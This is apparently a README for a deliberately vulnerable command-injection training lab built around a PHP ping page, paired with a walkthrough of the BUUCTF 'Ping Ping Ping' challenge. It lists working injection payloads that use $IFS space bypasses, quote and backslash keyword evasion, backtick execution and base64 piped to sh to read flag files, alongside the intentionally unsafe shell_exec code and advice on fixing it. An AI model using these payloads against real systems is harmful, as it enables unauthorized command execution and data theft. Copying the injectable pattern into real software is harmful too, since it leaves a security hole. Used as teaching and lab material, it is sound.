# Ping 页面命令执行（RCE / 命令注入）演示靶场

基于 **Nginx + PHP 7.3**（Alpine），目录 `ping-rce/`。故意将用户输入拼入 `ping` 命令，用于演示 **命令注入** 与常见绕过思路。

---

## 环境说明

- 访问：`docker-compose` 映射 **8082 → 80**（与 xxe 8081、访问控制 8080 区分）
- 系统：**Linux**（`ping` 为 `ping -c 1`）
- 动态 FLAG：`/flag` 与 `hhh/flag`（由入口脚本写入）
- 阶段性练习 1：网站根目录 `key.php`（静态 key 字符串）
- 可写目录：`writable/`（用于「写文件」演示，**仅授权环境**）

---

## 快速启动

```bash
cd ping-rce
docker build -t ping-rce-lab .
docker run -d --name ping-rce-lab -p 8082:80 ping-rce-lab
```

或：

```bash
cd ping-rce/docker
docker-compose up -d
```

浏览器访问：`http://127.0.0.1:8082/?ip=127.0.0.1`

----

## 讲解要点（与页面一致）

### 1、管道符

`;` `|` `&` `||` `&&` 等含义见页面表格。

- Windows 示例：`netstat -antp | find "3389"`
- **本靶场为 Linux**，可用：`netstat -antp | grep 3389` 或 `ss -lntp | grep 3389`

### 2、过滤空格

`%09`、`$IFS$9`、`${IFS}` 等。

示例：`127.0.0.1;cat$IFS$9/flag`

### 3、通配符

`?`、`*`；路径级绕过如 `cat /f???`、`cat /f*`。  
命令名处通配不可靠；可执行文件可用绝对路径如 `/bin/c?t`。

### 4、同等功能命令

`cat` → `tac` → `less` → `head` → `vi` → `od -a`（视环境）。

### 5、关键字过滤

如 `c'a't`、`ca\t`。

### 6、内联执行

反引号或 `$()`。  
**读取 `hhh/` 下 flag（页面要求）：**

```text
127.0.0.1;cd$IFS$9hhh&&cat$IFS$9`ls`
```

### 7、Base64

```text
127.0.0.1;echo Y2F0IC9mbGFn | base64 -d | sh
```

（`Y2F0IC9mbGFn` 为 `cat /flag` 的 Base64。）

### 8、拼接

变量、花括号、引号等组合绕过。

### 9、写马（先 txt 等）

示例见页面；**禁止用于未授权系统**。本环境仅写入 `writable/`。

---

## 阶段性练习 1

读取网站根目录下的 key（`key.php`）。

参考思路（需按实际路径调整）：

```text
127.0.0.1;l's' ../
127.0.0.1;c'a't$IFS$9../key.php
```


---

## 阶段性练习 2（BUUCTF Ping Ping Ping）

题目环境以在线为准，常见三类写法：

1. **内联 + `$IFS$9`**：`127.0.0.1;cat` + `$IFS$9` + 反引号 `ls` 反引号（整条作为 `ip`）
2. **Base64 + `sh`**：`127.0.0.1;echo$IFS$9dGFjIGZsYWcucGhw|base64$IFS$9-d|sh`（中间 Base64 随题目改；示例对应某题中的 `tac flag.php`）
3. **通配符或等价命令**：如 `127.0.0.1;tac$IFS$9/f*`、`127.0.0.1;ca\t$IFS$9/flag` 等

题目页：[BUUCTF - Ping Ping Ping](https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping)

历史节点 URL 示例（**可能已失效**，仅作格式参考）：

```text
http://7d4c8696-70a9-4530-bf64-8e4b426acbb3.node5.buuoj.cn:81/?ip=127.0.0.1;cat$IFS$9`ls`
http://7d4c8696-70a9-4530-bf64-8e4b426acbb3.node5.buuoj.cn:81/?ip=127.0.0.1;echo$IFS$9dGFjIGZsYWcucGhw|base64$IFS$9-d|sh
```

---

## 漏洞代码位置

`src/index.php` 中类似：

```php
$cmd = 'ping -c 1 ' . $ip . ' 2>&1';
$output = shell_exec($cmd);
```

修复方向：白名单校验 IP、使用 `escapeshellarg()`、避免拼接进 shell、改用 API 无 shell 调用等。

---

## 声明

仅用于**合法授权**的安全教学与实验，请勿用于未授权系统。
